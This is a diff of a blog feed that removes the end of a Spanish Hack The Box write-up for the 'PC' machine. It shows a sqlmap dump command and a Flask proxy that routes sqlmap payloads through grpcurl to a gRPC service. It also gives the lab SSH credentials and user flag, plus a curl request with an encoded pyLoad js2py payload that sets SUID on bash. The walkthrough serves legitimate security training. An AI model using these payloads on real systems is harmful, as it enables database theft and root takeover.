-{&quot;metadata&quot;:[{&quot;name&quot;:&quot;token&quot;,&quot;value&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYzRydGEiLCJleHAiOjE2ODQ5ODYwNDZ9.BVAx_9R6Cch8vwCUHknTLBm9l0wukqMrsy9TJcsGlJE&quot;}],&quot;data&quot;:[{&quot;id&quot;:&quot;738&quot;}]}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;Y el comando de sql map es:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -r &quot;$(pwd)/peticion&quot; -level 5 --risk 3 --batch --dump
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Eso automaticamente nos sacara todas las tablas, columnas, e informacion en ellas, ahi podremos ver un usuario y contraseñas&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/PC/sql1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/PC/sql2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;2-sql-injection-con-sqlmap-simulando-un-proxy&quot;&gt;2. SQL injection con sqlmap simulando un proxy&lt;/h3&gt;
-
-&lt;p&gt;(la idea de la solucion no es mia, &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Tysm to Cack for giving me the idea&lt;/code&gt;&lt;/strong&gt;)&lt;/p&gt;
-
-&lt;p&gt;Basicamente es levantar un servidor web con python, el cual actua como proxy, y que travez de un parametro recibira el payload de sqlmap. Este actuaria entre sqlmap y el servidor gRPC, el codigo al que llegue es:&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;subprocess&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;json&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;flask&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Flask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Flask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;nd&quot;&gt;@app.route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/payload&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ctrl_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;p&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&quot;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&apos;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;{&quot;id&quot;: &quot;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&quot;}&apos;&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;grpcurl&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;-plaintext&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;-d&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;-rpc-header&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYzRydGEiLCJleHAiOjE2ODQ5ODYwNDZ9.BVAx_9R6Cch8vwCUHknTLBm9l0wukqMrsy9TJcsGlJE&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;10.10.11.214:50051&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;SimpleApp.getInfo&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;check_output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;__main__&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12345&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Como pueden ver, al parametro ID vulnerable a SQLi se le concatena el payload, donde ese payload es el de sqlmap, despues se le pasa ese payload a la variable cmd, y por ultimo ejecuta ese comando, que vendria siendo el grpcurl pero con el payload de sqlmap&lt;/p&gt;
-
-&lt;p&gt;Y esto daria el mismo resultado que la primera forma:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/PC/sqli4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora solo queda conectarnos a ssh con las credenciales que obtuvimos&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;usr:&lt;/strong&gt; sau&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;passwd:&lt;/strong&gt; HereIsYourPassWord1431&lt;/p&gt;
-
-&lt;p&gt;Y ya tenemos la primera flag:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sau@pc:~$ cat user.txt 
-9346084c975a3b22536e1c6ef783075f
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h2 id=&quot;escalada&quot;&gt;Escalada&lt;/h2&gt;
-
-&lt;p&gt;Empezare usando linpeas para ver que nos reporta, lo mas interesante es que en la maquina victima esta corriendo el puerto 8000:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/PC/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Y como se imaginan, debemos de hacer port forwarding, ejecutamos este comando en nuestra maquina:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh -L 8000:127.0.0.1:8000 sau@10.10.11.214&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Una vez dentro, veremos una pagina de pyLoad, buscando en google por vulnerabilidades, existe una ejecucion arbitraria de codigo que abusa de la funcion js2py, aca hay un post que habla sobre ello: &lt;a href=&quot;https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/&quot;&gt;https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Para conseguir root, debemos de asignarle permisos SUID a bash, esto lo hacemos con:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -i -s -k -X $&apos;POST&apos; \
--H $&apos;Host: 127.0.0.1:8000&apos; -H $&apos;Content-Type: application/x-www-form-urlencoded&apos; -H $&apos;Content-Length: 184&apos; \
---data-binary $&apos;package=xxx&amp;amp;crypted=AAAA&amp;amp;jk=%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%63%68%6d%6f%64%20%75%2b%73%20%2f%62%69%6e%2f%62%61%73%68%22%29;f=function%20f2(){};&amp;amp;passwords=aaaa&apos; \
-$&apos;http://127.0.0.1:8000/flash/addcrypted2&apos;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/PC/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Y listo, esto es todo, gracias por leer ❤&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/PC/waifu.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><category term="HTB" /><category term="SQL injection" /><category term="gRPC" /><summary type="html">Esta es una maquina bien interesante por que no tiene puerto 80, asi que descubrimeros el puerto 50051 el cual esta siendo usado por gRPC, despues usaremos un cliente gRPC para ver un poco como se estan estructurando los protobof, con base a las respuestas de las peticiones, haremos un SQL injection en el parametro ID. Para la escalada haremos un port forwarding y explotaremos una vulnerabilidad en pyLoad.</summary></entry></feed>
+&lt;p&gt;&lt;img src=&quot;/assets/img/UPDWP-ssti/waifu.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><category term="SSTI" /><summary type="html">Te explicare como funciona la vulnerabilidad SSTI, sus payloads y como explotarla</summary></entry></feed>
